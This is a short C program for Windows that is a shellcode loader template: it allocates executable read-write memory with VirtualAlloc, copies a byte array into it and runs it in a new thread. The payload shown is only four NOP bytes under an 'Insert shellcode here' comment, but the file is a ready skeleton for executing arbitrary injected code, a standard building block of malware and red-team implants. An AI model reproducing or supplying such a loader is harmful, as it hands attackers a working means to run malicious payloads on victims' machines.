#include <stdio.h>
#include <windows.h>



void ShellcodeLoader()
{
	// Insert shellcode here
	unsigned char shellCode[] = "\x90\x90\x90\x90";


	HANDLE hVirtualAlloc;
	SIZE_T  dwSize = sizeof(shellCode);

	// Allocate memory for the shellcode
	if ((hVirtualAlloc = VirtualAlloc(NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)) == NULL) {
		printf("VirtualAlloc failed: %d\n", GetLastError());
		return;
	}
	else {
		printf("VirtualAlloc succeeded: %p\n", hVirtualAlloc);
	}

	// Copy shellcode into allocated memory
	if (memcpy(hVirtualAlloc, shellCode, dwSize) == NULL) {
		printf("memcpy failed: %d\n", GetLastError());
		return;
	}
	else {
		printf("memcpy succeeded: %p\n", hVirtualAlloc);
	}

	// Create a thread to execute the shellcode
	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)hVirtualAlloc, NULL, 0, NULL);
	if (hThread == NULL) {
		printf("CreateThread failed: %d\n", GetLastError());
		return;
	}
	else {
		printf("CreateThread succeeded: %p\n", hThread);
	}

	// Wait for the thread to finish
	WaitForSingleObject(hThread, INFINITE);
	
}




int main()
{
	ShellcodeLoader();
	return 0;
}
